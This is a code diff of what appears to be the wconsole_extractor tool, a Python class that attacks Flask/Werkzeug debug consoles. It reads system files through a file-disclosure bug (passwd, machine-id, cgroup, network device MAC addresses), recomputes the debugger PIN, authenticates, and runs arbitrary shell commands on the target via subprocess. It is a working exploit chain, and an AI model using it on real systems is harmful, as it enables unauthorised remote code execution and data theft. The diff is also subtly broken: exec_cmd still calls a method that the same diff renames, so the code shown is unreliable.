@@ -60,7 +60,7 @@ class WConsoleExtractor:
         debug_mode, content = self.check_debug_mode()
         if not debug_mode:
             error(f"{self.base_url} does not seem to be in debug mode, interrupting...")
-        
+
         # Check leak file function
         etc_passwd = self.leak_function("/etc/passwd")
         if not etc_passwd or not self.etc_passwd_regex.match(etc_passwd):
@@ -81,14 +81,14 @@ class WConsoleExtractor:
 
         if not self.flask_path:
             error("Unable to find flask package name, please report it (https://github.com/Ruulian/wconsole_extractor/issues)")
-        
+
         self.probably_public_bits = [
-            self.username, 
+            self.username,
             self.modname,
             self.class_name,
             self.flask_path
         ]
-        
+
         # Private bits
         self.machine_id = self.get_machine_id()
         self.uuidnode = self.get_uuid_node()
@@ -128,14 +128,14 @@ class WConsoleExtractor:
     @staticmethod
     def get_venv(environ:dict) -> bool:
         return environ.get("VIRTUAL_ENV")
-    
+
     @staticmethod
     def get_version(soft, server):
         version = re.findall(soft + r"\/(\d\.\d+)\..*", server)
         if len(version) == 0:
             error(f"{soft} version not found")
         return version[0].strip()
-    
+
     @staticmethod
     def compare_versions(v1:str, v2:str):
         v1_split = v1.split(".")
@@ -143,7 +143,7 @@ class WConsoleExtractor:
 
         for i in range(3 - len(v1_split)):
             v1_split.append("0")
-        
+
         for i in range(3 - len(v2_split)):
             v2_split.append("0")
 
@@ -154,44 +154,37 @@ class WConsoleExtractor:
                 return 1
             if diff < 0:
                 return -1
-        
+
         return 0
 
     @staticmethod
-    def sanitize_command_output(output:str):
-        return output.replace("\\n", "\n")[2:-1].strip()
-            
+    def sanitize_output(output:str):
+        return output.replace("\\n", "\n")[2:-1]
 
     def get(self, path:str):
         return self.sess.get(f"{self.base_url}{path}")
-    
+
     def get_headers(self):
         return self.get("/").headers
-    
+
     def ping(self):
         try:
             r = self.get("/")
             return r.status_code
         except:
             return 0
-        
+
     def check_debug_mode(self):
         r = self.get(self.debugger_path)
         return r.status_code == 200, r.text
-    
+
     def check_werkzeug(self):
         headers = self.get_headers()
         return headers.get("Server")
-    
+
     def print(self, message=""):
         print(message, end="")
 
-    def rprint(self, message=""):
-        if self.no_colors:
-            self.print(message)
-        else:
-            rprint(message)
-    
     # Leaks
     def choose_username(self, etc_passwd:str):
         usernames = []
@@ -213,14 +206,14 @@ class WConsoleExtractor:
         for k, v in environ.items():
             if k == "USERNAME" or k == "USER" or k == "LOGNAME":
                 return v
-            
+
             # HOME variable -> parse home dirname
             if k == "HOME":
                 if v.startswith("/home/"):
                     return v[6:]
                 else:
                     return v[1:]
-        
+
         return ""
 
     def get_flask_path(self, venv:str) -> str:
@@ -278,21 +271,21 @@ class WConsoleExtractor:
             r = self.leak_function(path)
             if r != "":
                 return path
-            
+
         return ""
-    
+
     def get_machine_id(self):
         value = ""
-        for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id": 
+        for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
             content = self.leak_function(filename)
             if content == "": continue
 
             v = content.splitlines()[0].strip()
-            
+
             if v:
                 value += v
                 break
-            
+
         try:
             content2 = self.leak_function("/proc/self/cgroup")
             value += content2.splitlines()[0].strip().rpartition("/")[2]
@@ -300,29 +293,43 @@ class WConsoleExtractor:
             pass
 
         return value
-    
+
     def get_uuid_node(self):
-        net_arp = self.leak_function("/proc/net/arp")
-        device_line = net_arp.splitlines()[1]
-        device_id = device_line.split(" ")[-1]
+        net_dev = self.leak_function("/proc/net/dev")
 
-        mac = self.leak_function(f"/sys/class/net/{device_id}/address")
+        device_ids = re.findall(r"(\w+):", net_dev)
+        # remove the loopback device
+        if "lo" in device_ids:
+            device_ids.remove("lo")
 
-        matched = re.findall(r"[0-9a-f:]+", mac)
+        if len(device_ids) == 0:
+            error("Unable to find device id, no interfaces found")
 
-        if len(matched) > 0:
-            uuid_node = str(int(matched[0].replace(":", ""), base=16))
+        # https://github.com/python/cpython/blob/1b0e63c81b54a937b089fe335761cba4a96c8cdf/Lib/uuid.py#L642
+        # Thus we first try to get the mac address of the first device alphabetically and then use the order of /proc/net/dev (which is the same as the order of ip link of _ip_getnode)
+        first_device = sorted(device_ids)[0]
+        device_ids.remove(first_device)
+        device_ids.insert(0, first_device)
 
-        return uuid_node
-    
+        for device_id in device_ids:
+            mac = self.leak_function(f"/sys/class/net/{device_id}/address")
+
+            matched = re.findall(r"[0-9a-f:]+", mac)
+
+            if len(matched) > 0:
+                uuid_node = str(int(matched[0].replace(":", ""), base=16))
+                return uuid_node
+        
+        error(f"Unable to find uuid node, no valid mac address found in {device_ids}")
+
     def compute_pin(self):
         is_v2 = WConsoleExtractor.compare_versions(self.werkzeug_version, "2.0.0") >= 0
-        
+
         if is_v2:
             h = hashlib.sha1()
         else:
             h = hashlib.md5() # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
-        
+
         for bit in chain(self.probably_public_bits, self.private_bits):
             if not bit:
                 continue
@@ -350,7 +357,7 @@ class WConsoleExtractor:
                 rv = num
 
         return rv
-    
+
     def get_token(self, token_request_content):
         token = re.findall(r'SECRET = "(.+)";', token_request_content)
 
@@ -358,7 +365,7 @@ class WConsoleExtractor:
             error("Error while finding token")
 
         return token[0]
-    
+
     def authent(self):
         authent_path = f"/?__debugger__=yes&cmd=pinauth&pin={self.pin_code}&s={self.token}"
         r = self.get(authent_path)
@@ -397,15 +404,31 @@ class WConsoleExtractor:
 
     def exec_cmd(self, cmd:str):
         argv = cmd.split(' ')
-        res = self.exec_console(
-            f"import subprocess; subprocess.Popen({argv},stdout=subprocess.PIPE,stderr=subprocess.STDOUT).communicate()[0]"
-        )
+        self.authent()
+
+        payload = f"import subprocess; subprocess.Popen({argv},stdout=subprocess.PIPE,stderr=subprocess.STDOUT).communicate()"
+        url = f"/console?__debugger__=yes&cmd={payload}&frm=0&s={self.token}"
+        res = self.get(url)
 
         if res.status_code == 404:
             error("Error while sending command, please report the issue on tool's repository")
             return
-    
-        output = self.parse_html(res.text)
+
+        soup = bs(res.text, 'html.parser')
+        span = soup.find("span", attrs={"class":"string"})
+        traceback = soup.find("div", attrs={"class":"traceback"})
+
+        if span:
+            res = span.contents[0]
+            extended = span.find("span")
+            if extended:
+                res += extended.contents[0]
+            output = WConsoleExtractor.sanitize_output(res)
+        elif traceback:
+            err = traceback.find("blockquote")
+            output = err.contents[0]
+        else:
+            output = ""
 
         return WConsoleExtractor.sanitize_command_output(output)
     
